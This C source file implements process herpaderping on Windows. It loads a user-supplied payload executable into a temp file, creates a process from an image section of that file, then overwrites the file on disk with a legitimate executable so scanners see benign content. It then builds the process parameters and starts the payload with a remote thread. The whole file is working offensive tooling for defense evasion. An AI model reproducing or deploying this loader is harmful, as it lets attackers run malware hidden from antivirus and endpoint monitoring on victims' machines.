# include <stdio.h>
# include "definitions.h"

# define MSG( msg, ... ) \
	printf( "[+] " msg "\n", ##__VA_ARGS__ )

# define PUTS( msg, ... ) \
	printf( "[-] " msg "\n", ##__VA_ARGS__ ); \
	return -1;
	
# define API_FPUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: %d\n\tMSG > " msg "\n", GetLastError(), ##__VA_ARGS__ ); \
	goto Cleanup

# define NT_PUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: 0x%0.8X\n\tMSG > " msg "\n", Status, ##__VA_ARGS__ ); \
	goto Cleanup

NTSTATUS Status;

int main( int argc, char* argv[] )
{
	void *hPayloadFile = 0, *pLocalPayloadBuf = 0, *hNtdll = 0, *hSection = 0, *hTempfile = 0, *hTargetProcess = 0, *hTargetFile = 0, *pTgtFileBuf = 0, *pEnvironment = 0;
	char *pPayloadFilename = 0, *pPathToOverwrite = 0;
	int Succeeded = 0;
	unsigned long ulRead = 0, ulWritten = 0, TargetFileSize = 0;
	unsigned long long ulBase = 0, ulEnd = 0;
	UNICODE_STRING CommandLine = { 0 }, ImagePath = { 0 }, CurrentDirectory = { 0 };
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = 0;
	PROCESS_BASIC_INFORMATION ProcessBasicInfo = { 0 };
	PEB RemotePeb = { 0 };
	PIMAGE_NT_HEADERS PayloadNtHeader = 0;

	size_t ulPayloadFilesize = 0, Total = 0;
	char CurrentDir[ MAX_PATH ] = { 0 };

	if ( argc != 3 )
	{
		PUTS( "USAGE: %s <path/to/payload.exe> <path/to/use/as/overwrite.exe>", argv[0] );
	}
	pPayloadFilename = argv[1];
	pPathToOverwrite = argv[2];
	MSG("%s",pPathToOverwrite);


	if ( ( hNtdll = GetModuleHandleA( "ntdll.dll" ) ) == NULL )
	{
		API_FPUTS( "GetModuleHandleA", "Could not get handle to ntdll" );
	}
	fRtlInitUnicodeString RtlInitUnicodeString = ( fRtlInitUnicodeString )GetProcAddress( hNtdll, "RtlInitUnicodeString" );
	fNtCreateSection NtCreateSection = ( fNtCreateSection )GetProcAddress( hNtdll, "NtCreateSection" );
	fNtCreateProcessEx NtCreateProcessEx = ( fNtCreateProcessEx )GetProcAddress( hNtdll, "NtCreateProcessEx" );
	fNtQueryInformationProcess NtQueryInformationProcess = ( fNtQueryInformationProcess )GetProcAddress( hNtdll, "NtQueryInformationProcess" );

	fCreateEnvironmentBlock CreateEnvironmentBlock = ( fCreateEnvironmentBlock )GetProcAddress( LoadLibraryA( "Userenv.dll" ), "CreateEnvironmentBlock" );
	fRtlCreateProcessParametersEx RtlCreateProcessParametersEx = ( fRtlCreateProcessParametersEx )GetProcAddress( hNtdll, "RtlCreateProcessParametersEx" );

	/*
		Step 1: Read payload from user
	*/
	if ( ( hPayloadFile = CreateFileA( pPayloadFilename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		API_FPUTS( "CreateFileA", "Could not get handle to payload file %s", pPayloadFilename );
	}
	if ( ( ulPayloadFilesize = GetFileSize( hPayloadFile, 0 ) ) == INVALID_FILE_SIZE )
	{
		API_FPUTS( "GetFileSize", "Could not get size of payload file %s", pPayloadFilename );
	}
	if ( ( pLocalPayloadBuf = VirtualAlloc( 0, ulPayloadFilesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		API_FPUTS( "VirtualAlloc", "Could not allocate memory for payload" );
	}
	if ( !ReadFile( hPayloadFile, pLocalPayloadBuf, ( unsigned long )ulPayloadFilesize, &ulRead, 0 )  )
	{
		API_FPUTS( "ReadFile", "Could not read file to buffer" );
	}
	PayloadNtHeader = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pLocalPayloadBuf + ( ( PIMAGE_DOS_HEADER )pLocalPayloadBuf )->e_lfanew ); 
	if ( PayloadNtHeader->Signature != IMAGE_NT_SIGNATURE )
	{
		PUTS( "%s is not an executable file.", pPayloadFilename );
	}
	MSG( "Read %zu bytes from %s to buffer at 0x%p", ulPayloadFilesize, pPayloadFilename, pLocalPayloadBuf );

	/*
		Step 2: Create an empty file on disk
	*/
	GetCurrentDirectoryA( MAX_PATH, CurrentDir );
	if ( GetTempFileNameA( CurrentDir, "PHD", 0, ( char* )CurrentDir ) == 0  )
	{
		API_FPUTS( "GetTempFileNameA", "Could not create temporary file" );
	}
	if ( ( hTempfile = CreateFileA( CurrentDir, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		API_FPUTS( "CreateFileA", "Could not get handle to temporary file" );
	}
	MSG( "Created temporary file at the path %s", CurrentDir );

	/* 
		Step 3: Overwrite the temp file with the payload
	*/
	if ( !WriteFile( hTempfile, pLocalPayloadBuf, ( unsigned long )ulPayloadFilesize, &ulWritten, 0 ) )
	{
		API_FPUTS( "WriteFile", "Could not write payload to temporary file" );
	}
	MSG( "Wrote payload to temp file" );

	/*
		Step 4: Create a section handle from the temporary file
	*/
	if ( ( Status = NtCreateSection( &hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hTempfile ) ) != 0x0 )
	{
		NT_PUTS( "NtCreateSection", "Could not create section from temporary file" );
	}
	MSG( "Created section from temporary file" );

	/*
		Step 5: Create a process from the section
	*/
	if ( ( Status = NtCreateProcessEx( &hTargetProcess, PROCESS_ALL_ACCESS, 0, ( void* )-1, 0, hSection, 0, 0, 0 ) ) )
	{
		NT_PUTS( "NtCreateProcessEx", "Could not create a process from the section" );
	}
	MSG( "Created suspended process from image section. pid: %d", GetProcessId( hTargetProcess ) );

	/*
		Step 6: Overwrite the temporary file with a legitimate PE file
	*/
	if ( ( hTargetFile = CreateFileA( pPathToOverwrite, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		NT_PUTS( "CreateFileA", "Could not get a handle to %s", pPathToOverwrite );
	}
	TargetFileSize = GetFileSize( hTargetFile, 0 );

	if ( TargetFileSize < ulPayloadFilesize )
	{
		PUTS( "Target image must be larger than payload." );
	}

	pTgtFileBuf = VirtualAlloc( 0, TargetFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

	if ( !ReadFile( hTargetFile, pTgtFileBuf, TargetFileSize, &ulRead, 0 ) )
	{
		API_FPUTS( "ReadFile", "Could not read contents from %s to buffer at 0x%p", pPathToOverwrite, pTgtFileBuf );
	}
	if ( SetFilePointer( hTempfile, 0, 0, FILE_BEGIN ) == INVALID_SET_FILE_POINTER )
	{
		API_FPUTS( "SetFilePointer", "Could not move tempfile pointer to beginning of file." );
	}
	if ( !WriteFile( hTempfile, pTgtFileBuf, TargetFileSize, &ulWritten, 0 ) )
	{
		API_FPUTS( "WriteFile", "Could not overwrite temp file with legitimate PE" );
	}
	MSG( "Overwrote temporary file with contents of %s", pPathToOverwrite);

	/*
		Step 7: Add process parameters & environment variable block to new process peb
	*/
	if ( ( Status = NtQueryInformationProcess( hTargetProcess, 0, ( void* )&ProcessBasicInfo, sizeof( PROCESS_BASIC_INFORMATION ), &ulWritten ) ) != 0x0 )
	{
		NT_PUTS( "NtQueryInformationProcess", "Could not retrieve target process peb address" );
	}

	RtlInitUnicodeString( &CommandLine, ( wchar_t* )pPathToOverwrite );
	RtlInitUnicodeString( &ImagePath, ( wchar_t* )pPathToOverwrite );
	RtlInitUnicodeString( &CurrentDirectory, L"c:\\Windows\\system32\\" );

	if ( !CreateEnvironmentBlock( &pEnvironment, 0, TRUE ) )
	{
		API_FPUTS( "CreateEnvironmentBlock", "Could not create an environment variable block");
	}
	if ( ( Status = RtlCreateProcessParametersEx( &ProcessParameters, &ImagePath, 0, &CurrentDirectory, &CommandLine, pEnvironment, 0, 0, 0, 0, RTL_USER_PROC_PARAMS_NORMALIZED ) ) != 0x0 )
	{
		NT_PUTS( "RtlCreateProcessParametersEx", "Could not create process parameters." );
	}
	
	ulBase = ( unsigned long long )ProcessParameters;
	ulEnd = ( unsigned long long )ProcessParameters + ProcessParameters->Length;

	if ( ( unsigned long long )ProcessParameters > ( unsigned long long )ProcessParameters->Environment)
	{
		ulBase = ( unsigned long long )ProcessParameters->Environment;
	}
	if ( ( ( unsigned long long )ProcessParameters + ProcessParameters->EnvironmentSize ) > ulEnd )
	{
		ulEnd = ( unsigned long long )ProcessParameters->Environment + ProcessParameters->EnvironmentSize;
	}
	Total = ulEnd - ulBase;
	MSG( "Created process parameters. Start 0x%I64X, End 0x%I64X, Total: %zu", ulBase, ulEnd, Total );

	if ( !VirtualAllocEx( hTargetProcess, ProcessParameters, Total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) )
	{
		API_FPUTS( "VirtualAllocEx", "Could not allocate memory in target process for the process parameters in peb" );
	}
	if ( !WriteProcessMemory( hTargetProcess, ( void* )ProcessParameters, ( void* )ProcessParameters, Total, ( size_t* )&ulWritten ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not write parameters to the remote processs" );
	}
	if ( !WriteProcessMemory( hTargetProcess, &ProcessBasicInfo.PebBaseAddress->ProcessParameters, (void*) & ProcessParameters, sizeof(void*), (size_t*)&ulWritten))
	{
		API_FPUTS( "WriteProcessMemory", "Could not update address of ProcessParameters in target process peb");
	}
	MSG( "Wrote process parameters to target process at 0x%p", ProcessParameters);

	if ( !WriteProcessMemory( hTargetProcess, ProcessParameters->Environment, ProcessParameters->Environment, ProcessParameters->EnvironmentSize, ( size_t* )&ulWritten) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not write environment variables to target process" );
	}
	MSG( "Wrote environment variables to target process." );


	/*
		Step 9: Execute the payload
	*/
	if ( !ReadProcessMemory( hTargetProcess, ( void* )ProcessBasicInfo.PebBaseAddress, ( void* )&RemotePeb, sizeof( PEB ), ( size_t* )&ulWritten ) )
	{
		API_FPUTS( "ReadProcessMemory", "Could not read target process peb to structure in local memory at 0x%p", ( void* )&RemotePeb );
	}
	if ( !CreateRemoteThread( hTargetProcess, 0, 0, ( LPTHREAD_START_ROUTINE )( ( unsigned long long )( RemotePeb.ImageBaseAddress ) + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint ), 0, 0, 0 ) )
	{
		API_FPUTS( "CreateRemoteThread", "Could not execute herpaderped process!");
	}
	MSG( "Executed herpaderped process! \n\t> PEB: 0x%p\n\t> Base: 0x%p\n\t> Entry: 0x%p", ProcessBasicInfo.PebBaseAddress, RemotePeb.ImageBaseAddress, ( unsigned long long )( RemotePeb.ImageBaseAddress ) + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint );
	
	Succeeded = TRUE;
	getchar();

Cleanup:
	if ( hPayloadFile )
		CloseHandle( hPayloadFile );

	if ( pLocalPayloadBuf )
		VirtualFree( pLocalPayloadBuf, 0, MEM_RELEASE );

	if ( hTempfile )
		CloseHandle( hTempfile );

	if ( hTargetProcess && !Succeeded )
		TerminateProcess( hTargetProcess, 0 );


	return -1;
}